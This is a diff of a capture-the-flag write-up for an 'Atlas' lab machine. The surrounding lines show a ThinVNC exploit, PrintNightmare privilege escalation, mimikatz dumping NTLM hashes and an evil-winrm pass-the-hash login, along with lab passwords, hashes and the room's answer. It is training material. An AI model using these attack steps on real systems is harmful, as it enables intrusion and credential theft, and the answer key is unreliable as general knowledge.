@@ -253,7 +253,6 @@ We would usually go on to do a lot more in-depth scanning, but we will leave it 
 
  Completed
 
-
 ### Enumeration Service Enumeration
 
 In the previous task we discovered two services -- now it's time to see what we can do with them!
@@ -339,7 +338,6 @@ Use searchsploit to find the vulnerability in ThinVNC
 <HTML><HEAD><TITLE>401 Access Denied</TITLE></HEAD><BODY><H1>401 Access Denied</H1>The requested URL  requires authorization.<P></BODY></HTML>
 * Connection #0 to host 10.10.92.200 left intact
 
-
 ┌──(kali㉿kali)-[~]
 └─$ searchsploit ThinVNC                                                                          
 ---------------------------------------------------------------------------- ---------------------------------
@@ -358,7 +356,6 @@ Shellcodes: No Results
  Verified: True
 File Type: Python script, ASCII text executable
 Copied to: /home/kali/47519.py
-
 
                                                                                                               
 ┌──(kali㉿kali)-[~]
@@ -388,8 +385,6 @@ def exploit(host,port):
     body = r.text
     print(body.splitlines()[2])
     print(body.splitlines()[3])
-
-
 
 def main():
     if(len(sys.argv)!=3):
@@ -533,11 +528,6 @@ AutoStart=1
 yep I did it, using burpsuite and curl :)
 ```
 
-![[Pasted image 20230101223920.png]]
-![[Pasted image 20230101223935.png]]
-
-![[Pasted image 20230101224137.png]]
-
 ### Access VNC 🠖 RDP
 
 If you've reached this task then you should have user access to the machine -- congratulations!
@@ -581,7 +571,6 @@ adjusting for me
 
 ┌──(kali㉿kali)-[~/CVE-2019-17662]
 └─$ xfreerdp /v:10.10.196.63 /u:Atlas /p:H0ldUpTheHe@vens /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp /size:85%
-
 
 ```
 
@@ -709,7 +698,6 @@ PS C:\Users\Atlas> Invoke-Nightmare
 [+] deleting payload from C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll
 PS C:\Users\Atlas> Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n
 
-
 Microsoft Windows [Version 10.0.17763.1821]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
@@ -734,11 +722,7 @@ Mandatory Label\High Mandatory Level                          Label            S
 
 :)
 
-
-
 ```
-
-![[Pasted image 20230101230304.png]]
 
 ###  Attack Post Exploitation
 
@@ -877,7 +861,6 @@ CVE-2021-1675
 hsperfdata_kali
 mimikatz.exe
 
-
 C:\Windows\system32>\\tsclient\share\mimikatz.exe
 
   .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
@@ -969,7 +952,6 @@ Supplemental Credentials:
     OldCredentials
       des_cbc_md5       : 08340db613fb46b5
 
-
 RID  : 000001f5 (501)
 User : Guest
 
@@ -999,7 +981,6 @@ Supplemental Credentials:
     Default Salt : WDAGUtilityAccount
     Credentials
       des_cbc_md5       : ce9b2cabd55df4ce
-
 
 RID  : 000003f0 (1008)
 User : Atlas
@@ -1031,7 +1012,6 @@ Supplemental Credentials:
     OldCredentials
       des_cbc_md5       : dff41c61ea4967c8
 
-
 RID  : 000003f1 (1009)
 User : adm1n
   Hash NTLM: e19ccf75ee54e06b06a5907af13cef42
@@ -1056,7 +1036,6 @@ Supplemental Credentials:
     Credentials
       des_cbc_md5       : bc3215971f7c4525
 
-
 ┌──(kali㉿kali)-[/tmp]
 └─$ evil-winrm -i 10.10.196.63 -u Administrator -H "c16444961f67af7eea7e420b65c8c3eb" -N
 
@@ -1070,11 +1049,9 @@ Info: Establishing connection to remote endpoint
 
 ```
 
-
 What is the Administrator account's NTLM password hash?
 
 *c16444961f67af7eea7e420b65c8c3eb*
-
 
 ### Conclusion Final Thoughts
 
@@ -1087,7 +1064,5 @@ Kudos for completing the room: now go hack some more!
 Answer the questions below
 
 I hacked Atlas!
-
-
 
 [[NoSQL injection Basics]]
